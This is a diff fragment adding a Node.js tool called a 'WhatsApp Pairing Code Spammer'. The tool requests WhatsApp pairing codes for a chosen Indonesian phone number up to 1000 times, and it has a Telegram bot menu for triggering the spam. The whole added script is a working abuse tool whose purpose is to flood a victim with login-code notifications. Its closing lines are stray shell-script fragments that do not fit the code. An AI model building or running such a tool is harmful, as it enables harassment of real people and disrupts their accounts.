+        const text = msg.text;
+
+        if (text === '/start') {
+            showMainMenu(chatId);
+        } else if (text === '/spam') {
+            telegramBot.sendMessage(chatId, 'Please enter the target number (62xxxxxxxx):');
+            // You would need to implement conversation handling here
+        }
+    });
+
+    console.log(currentColor + 'Telegram bot initialized successfully!' + colors.reset);
+}
+
+// Show main menu
+function showMainMenu(chatId) {
+    const options = {
+        reply_markup: {
+            keyboard: [
+                ['Spam Pairing Code'],
+                ['Check Status', 'Help']
+            ],
+            resize_keyboard: true,
+            one_time_keyboard: true
+        }
+    };
+
+    telegramBot.sendMessage(chatId, 'Main Menu:', options);
+}
+
+// WhatsApp Bot Functionality
+async function WhatsAppBot() {
+    const { state } = await useMultiFileAuthState('./session');
+    const whatsappBot = makeWASocket({
+        logger: pino({ level: "silent" }),
+        printQRInTerminal: false,
+        auth: state,
+        connectTimeoutMs: 60000,
+        defaultQueryTimeoutMs: 0,
+        keepAliveIntervalMs: 10000,
+        emitOwnEvents: true,
+        fireInitQueries: true,
+        generateHighQualityLinkPreview: true,
+        syncFullHistory: true,
+        markOnlineOnConnect: true,
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+    });
+
+    return whatsappBot;
+}
+
+// Main function
+async function main() {
+    console.log(currentColor + `Running... WhatsApp Pairing Code Spammer
+=========================
+ • WhatsApp Pairing Code Spammer
+ • by FlowFalcon
+ • Do not misuse 
+=========================
+┏❐ 
+┃ [ BOT INSTRUCTIONS ]
+┃
+┃⭔ Target Number (62xxxxxxxx)
+┃⭔ How much spam (1-1000)
+┃
+┃ [ THIS TOOL CAN ONLY BE USED ON NUMBER +62 ]
+┗❐ 
+=========================` + colors.reset);
+
+    // Initialize Telegram bot
+    initTelegramBot();
+
+    // Check if running in Telegram mode or console mode
+    if (!telegramToken) {
+        // Console mode
+        const phoneNumber = await question(currentColor + 'Target Number (62xxxxxxxx): ' + colors.reset);
+        const spamCount = parseInt(await question(currentColor + 'Total spam (1-1000): ' + colors.reset));
+
+        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 1000) {
+            console.log('Please enter a valid number between 1-1000.');
+            return;
+        }
+
+        const whatsappBot = await WhatsAppBot();
+
+        for (let i = 0; i < spamCount; i++) {
+            try {
+                let code = await whatsappBot.requestPairingCode(phoneNumber);
+                code = code?.match(/.{1,4}/g)?.join("-") || code;
+                console.log(currentColor + `Success Spam Pairing Code - Number: ${phoneNumber} [${i + 1}/${spamCount}]` + colors.reset);
+                
+                // Send notification to Telegram if bot is active
+                if (telegramBot && chatId) {
+                    telegramBot.sendMessage(chatId, `Success Spam Pairing Code - Number: ${phoneNumber} [${i + 1}/${spamCount}]`);
+                }
+            } catch (error) {
+                console.error('Error:', error.message);
+                if (telegramBot && chatId) {
+                    telegramBot.sendMessage(chatId, `Error: ${error.message}`);
+                }
+            }
+        }
+    }
+}
+
+// Start the application
+main().catch(console.error);
 fi
 
 if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
